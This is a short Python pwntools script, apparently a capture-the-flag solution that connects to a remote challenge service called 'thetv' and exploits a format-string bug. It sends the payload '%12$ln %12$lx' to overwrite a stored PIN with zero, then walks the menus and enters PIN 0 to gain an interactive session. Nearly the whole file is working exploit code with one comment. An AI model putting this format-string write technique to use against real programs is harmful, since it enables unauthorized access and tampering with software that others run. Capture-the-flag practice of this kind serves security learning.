#!/usr/bin/env python3
from pwn import *

'''
p = gdb.debug("./thetv", gdbscript=""" 
    break *checkPin+35 
    continue 
 
""") 
''' 
p = remote("0.cloud.chals.io", 30658) 
p.recvuntil(b"> ") 
p.sendline(b"p") 

p.recvuntil(b"> ") 
p.sendline(b"%12$ln %12$lx") # %12$lx is not needed, its just to make sure we're writing into the correct address.  

p.recvuntil(b"You say: ") 
leak = p.recvline().strip() 
#print(leak) 
p.recvuntil(b"> ")  
p.sendline(b"c") 

p.recvuntil(b"> ")  
p.sendline(b"y") 

p.recvuntil(b"> ") 
p.sendline(b"6") 

p.recvuntil(b"the pin: ") 
p.sendline(b"0") 
p.interactive() 

